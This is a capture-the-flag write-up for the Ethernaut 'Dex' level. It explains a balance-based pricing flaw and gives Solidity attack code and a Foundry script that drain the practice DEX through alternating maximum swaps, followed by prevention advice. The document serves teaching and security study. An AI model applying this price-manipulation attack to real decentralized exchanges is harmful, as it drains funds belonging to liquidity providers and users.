# Ethernaut Level 22: Dex

## Challenge Overview

This level demonstrates a classic **price manipulation attack** on a decentralized exchange (DEX) contract. The goal is to drain all tokens from the DEX by exploiting the flawed price calculation mechanism.

## Challenge Details

- **Submit Transaction Hash**: `0xd656eb93bb81078de25f1c92819fb53d70c234e23aa0cf1faeac1cd7f2a9e724`
- **Instance Address**: `0xEba578e30d15AE2390d06E88F4eafc465Ff46f22`
- **Level Address**: `0x78daf9a017BB1B8f07bbDc881a95eF3d87348599`

## Initial Setup

- **Player starts with**: 10 tokens of token1 and 10 tokens of token2
- **DEX starts with**: 100 tokens of each token
- **Goal**: Drain all of at least 1 of the 2 tokens from the DEX contract

## Vulnerability Analysis

### The Flawed Price Calculation

The DEX uses a simple price formula in `getSwapPrice()`:

```solidity
function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
    return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
}
```

This formula calculates price as: `(amount * toTokenBalance) / fromTokenBalance`

### The Attack Vector

The vulnerability lies in the fact that **price changes as balances change**. As you swap tokens:

1. **From token balance decreases** (you give tokens to DEX)
2. **To token balance increases** (DEX gives you tokens)
3. **Price calculation becomes increasingly favorable** for the attacker

### Attack Strategy

The attack exploits the price manipulation by:

1. **Alternating swaps** between token1 ↔ token2
2. **Using maximum possible amounts** each time
3. **Taking advantage of price changes** after each swap

## Solution Implementation

### Attack Contract Structure

```solidity
contract Attack {
    Dex dex;
    address private owner;
    address public tkn1;
    address public tkn2;
    uint8 count;

    constructor(address _owner, Dex _dex) {
        owner = _owner;
        dex = _dex;
        tkn1 = dex.token1();
        tkn2 = dex.token2();
    }
}
```

### Key Functions

1. **`ApprovalAndSendTokens()`**: Transfers player's tokens to attack contract and approves DEX
2. **`loop()`**: Executes alternating swaps for price manipulation
3. **`priceManipulation()`**: Performs the actual swap with optimal amount calculation

### Attack Flow

1. **Setup Phase**:

   - Deploy attack contract
   - Approve attack contract to spend player's tokens
   - Transfer tokens to attack contract
   - Approve DEX to spend attack contract's tokens

2. **Execution Phase**:

   - Perform alternating swaps (token1→token2, token2→token1)
   - Each swap uses the maximum possible amount
   - Continue until one token is completely drained

3. **Result**:
   - DEX is drained of at least one token
   - Attack contract accumulates all tokens

## Technical Details

### Price Manipulation Logic

```solidity
function priceManipulation(address _from, address _to) internal {
    uint256 myBalance = dex.balanceOf(_from, address(this));
    uint256 dexBalance = dex.balanceOf(_from, address(dex));
    uint256 swapAmount = myBalance < dexBalance ? myBalance : dexBalance;

    if (swapAmount > 0) {
        dex.swap(_from, _to, swapAmount);
    }
}
```

This ensures we always swap the maximum possible amount, maximizing the price manipulation effect.

### Execution Script

```solidity
contract Solve is Script {
    function run() external {
        dex = Dex(instanceAddr);

        vm.startBroadcast();
        attack = new Attack(msg.sender, dex);
        IERC20(dex.token1()).approve(address(attack), type(uint256).max);
        IERC20(dex.token2()).approve(address(attack), type(uint256).max);
        attack.ApprovalAndSendTokens();
        attack.loop();
        vm.stopBroadcast();
    }
}
```

## Prevention

To prevent this attack, DEX contracts should:

1. **Use external price oracles** (Chainlink, etc.)
2. **Implement time-weighted average prices (TWAP)**
3. **Add slippage protection**
4. **Use constant product formula** (like Uniswap: x \* y = k)
5. **Implement maximum trade size limits**

## Key Learnings

- **Price manipulation** is a critical vulnerability in DEX contracts
- **Simple price formulas** based on current balances are exploitable
- **External price feeds** are essential for secure DEX implementations
- **Mathematical invariants** (like constant product) provide better price stability

## Files

- `src/Dex.sol` - Vulnerable DEX contract
- `script/Solve.s.sol` - Attack implementation
- `test/test.t.sol` - Test cases

---

_This challenge demonstrates the importance of secure price calculation mechanisms in decentralized finance protocols._
